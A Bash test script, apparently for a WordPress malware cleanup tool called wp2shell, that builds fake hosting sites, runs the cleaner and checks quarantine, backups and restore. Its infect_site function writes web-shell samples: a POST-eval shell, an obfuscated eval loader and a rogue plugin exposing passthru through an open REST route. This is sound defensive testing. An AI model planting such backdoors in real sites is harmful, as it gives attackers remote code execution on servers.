#!/bin/bash
set -uo pipefail

REPO_ROOT=$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")/.." && pwd)

tests_run=0
tests_failed=0

expect_equal() {
    local label=$1 expected=$2 actual=$3
    tests_run=$((tests_run + 1))
    if [ "$expected" = "$actual" ]; then
        printf 'ok   %s\n' "$label"
    else
        printf 'FAIL %s: verwacht "%s", kreeg "%s"\n' "$label" "$expected" "$actual" >&2
        tests_failed=$((tests_failed + 1))
    fi
}

FIXTURE=$(mktemp -d -t wp2shell-fleet.XXXXXXXX)
trap 'rm -rf -- "$FIXTURE"' EXIT

WP_STUB="$FIXTURE/wp-stub"
{
    printf '#!/bin/bash\n'
    printf 'args=("$@")\n'
    printf 'case " ${args[*]} " in\n'
    printf '    *" is-installed "*) exit 0 ;;\n'
    printf '    *" db prefix "*) printf %swp_\\n%s; exit 0 ;;\n' "'" "'"
    printf '    *" db query "*) exit 0 ;;\n'
    printf '    *" option get active_plugins "*) printf %s[]\\n%s; exit 0 ;;\n' "'" "'"
    printf '    *" db export - "*) printf -- %s-- dump\\nCREATE TABLE wp_posts (id int);\\n%s; exit 0 ;;\n' "'" "'"
    printf '    *" core version "*) printf %s7.0.3\\n%s; exit 0 ;;\n' "'" "'"
    printf '    *" verify-checksums "*) printf %sSuccess: WordPress installation verifies against checksums.\\n%s; exit 0 ;;\n' "'" "'"
    printf '    *" user list "*) printf %s[]\\n%s; exit 0 ;;\n' "'" "'"
    printf '    *" event list "*) printf %s[]\\n%s; exit 0 ;;\n' "'" "'"
    printf '    *" plugin list "*) printf %s[]\\n%s; exit 0 ;;\n' "'" "'"
    printf '    *) exit 0 ;;\n'
    printf 'esac\n'
} > "$WP_STUB"
chmod 0755 "$WP_STUB"

make_site() {
    local root=$1 version=$2
    mkdir -p "$root/wp-includes" "$root/wp-admin" "$root/wp-content/uploads" \
        "$root/wp-content/cache" "$root/wp-content/plugins"
    {
        printf '<?php\n'
        printf '$wp_version = %s%s%s;\n' "'" "$version" "'"
        printf '$wp_db_version = 60717;\n'
    } > "$root/wp-includes/version.php"
    printf '<?php\n' > "$root/wp-config.php"
    printf '<?php\n' > "$root/index.php"
}

infect_site() {
    local root=$1
    printf '<?php @eval($_POST["x"]); header("HTTP/1.0 404 Not Found");\n' \
        > "$root/wp-content/uploads/shell.php"
    printf '<?php eval(gzuncompress(base64_decode("H4sIA")));\n' \
        > "$root/wp-content/cache/pack.php"
    mkdir -p "$root/wp-content/plugins/gg-x1"
    printf '<?php\nregister_rest_route("evil/v1","/r",array("permission_callback"=>"__return_true","callback"=>function($r){passthru(base64_decode($r->get_param("c")));}));\n' \
        > "$root/wp-content/plugins/gg-x1/x.php"
}

HOME_BASE="$FIXTURE/home"
make_site "$HOME_BASE/klant1/domains/een.nl/public_html" "6.9.4"
infect_site "$HOME_BASE/klant1/domains/een.nl/public_html"
make_site "$HOME_BASE/klant2/domains/twee.nl/public_html" "7.0.1"
infect_site "$HOME_BASE/klant2/domains/twee.nl/public_html"
make_site "$HOME_BASE/klant2/domains/twee.nl/public_html/shop" "6.9.2"
infect_site "$HOME_BASE/klant2/domains/twee.nl/public_html/shop"
make_site "$HOME_BASE/klant3/domains/drie.nl/public_html" "7.0.3"
printf '<?php $legit = base64_decode("aGk=");\n' \
    > "$HOME_BASE/klant3/domains/drie.nl/public_html/wp-content/plugins/normaal.php"

CONFIG="$FIXTURE/fleet.conf"
{
    printf 'WP2SHELL_REPORT_EMAIL=""\n'
    printf 'WP2SHELL_REPORT_DIR="%s/reports"\n' "$FIXTURE"
    printf 'WP2SHELL_LOCK_FILE="%s/lock"\n' "$FIXTURE"
    printf 'WP2SHELL_HOME_BASE="%s"\n' "$HOME_BASE"
    printf 'WP2SHELL_DOCROOT_GLOBS=("%s/*/domains/*/public_html")\n' "$HOME_BASE"
    printf 'WP2SHELL_BACKUP_DIR="%s/backups"\n' "$FIXTURE"
    printf 'WP2SHELL_QUARANTINE_DIR="%s/quarantine"\n' "$FIXTURE"
    printf 'WP2SHELL_WP_CLI_PATH="%s"\n' "$WP_STUB"
    printf 'WP2SHELL_USE_DIRECTADMIN_ENUMERATION=0\n'
    printf 'WP2SHELL_SCAN_LOGS=0\n'
    sed -n '/^declare -gA/,/^)$/p' "$REPO_ROOT/config/wp2shell.conf"
} > "$CONFIG"

count_malware() {
    find "$HOME_BASE" \( -name 'shell.php' -o -name 'pack.php' -o -name 'x.php' \) -type f 2>/dev/null | wc -l
}

expect_equal "de fixture start met negen kwaadaardige bestanden" "9" "$(count_malware)"

"$REPO_ROOT/wp2shell.sh" clean --config "$CONFIG" --no-mail >/dev/null 2>&1
expect_equal "zonder --apply blijft alles staan" "9" "$(count_malware)"

"$REPO_ROOT/wp2shell.sh" clean --config "$CONFIG" --apply --no-mail >/dev/null 2>&1

expect_equal "met --apply is alle malware weg op alle sites" "0" "$(count_malware)"

expect_equal "de legitieme plugin op de schone site staat er nog" "ja" \
    "$([ -f "$HOME_BASE/klant3/domains/drie.nl/public_html/wp-content/plugins/normaal.php" ] && printf 'ja' || printf 'nee')"

expect_equal "wp-config.php is nergens aangeraakt" "4" \
    "$(find "$HOME_BASE" -name 'wp-config.php' -type f | wc -l)"

expect_equal "elke site heeft een backup met manifest" "4" \
    "$(find "$FIXTURE/backups" -name 'manifest.json' -type f 2>/dev/null | wc -l)"
expect_equal "elke site heeft een databasedump" "4" \
    "$(find "$FIXTURE/backups" -name 'database.sql' -type f 2>/dev/null | wc -l)"

expect_equal "alle negen bestanden staan in quarantaine" "9" \
    "$(find "$FIXTURE/quarantine" -path '*/files/*' -type f 2>/dev/null | wc -l)"
MANIFEST_LINES=$(find "$FIXTURE/quarantine" -name manifest.ndjson -exec cat {} + 2>/dev/null | wc -l)
expect_equal "de manifesten hebben samen negen regels" "9" "$MANIFEST_LINES"

REPORT_DIR=$(find "$FIXTURE/reports" -mindepth 1 -maxdepth 1 -type d | head -1)
count_in_report() {
    local needle=$1 result
    result=$(grep -c -- "$needle" "$REPORT_DIR/findings.ndjson" 2>/dev/null) || result=0
    case $result in
        ''|*[!0-9]*) result=0 ;;
    esac
    printf '%s' "$result"
}

expect_equal "elke site is na het opschonen geverifieerd" "4" \
    "$(count_in_report 'cleanup-verified')"
expect_equal "geen enkele site blijft als onvolledig achter" "0" \
    "$(count_in_report '"category":"cleanup-incomplete"')"
expect_equal "geen enkele site blijft ongeverifieerd" "0" \
    "$(count_in_report '"category":"cleanup-unverified"')"

expect_equal "het rapport is geldige JSON" "geldig" \
    "$(php -r '$d=json_decode(file_get_contents($argv[1]),true); echo $d===null?"ongeldig":"geldig";' "$REPORT_DIR/report.json")"

RESTORED=0
while IFS= read -r manifest; do
    bash -c '
        . "$1/lib/common.sh"
        . "$1/config/wp2shell.conf"
        . "$1/lib/quarantine.sh"
        detect_optional_commands
        resolve_external_tools >/dev/null 2>&1
        restore_from_manifest "$2"
    ' _ "$REPO_ROOT" "$manifest" >/dev/null 2>&1
    RESTORED=1
done < <(find "$FIXTURE/quarantine" -name manifest.ndjson 2>/dev/null)

expect_equal "er is een herstelpoging gedaan" "1" "$RESTORED"
expect_equal "alle negen bestanden zijn terug te zetten uit quarantaine" "9" "$(count_malware)"

printf '\n%s tests, %s mislukt\n' "$tests_run" "$tests_failed"
if [ "$tests_failed" -gt 0 ]; then
    exit 1
fi
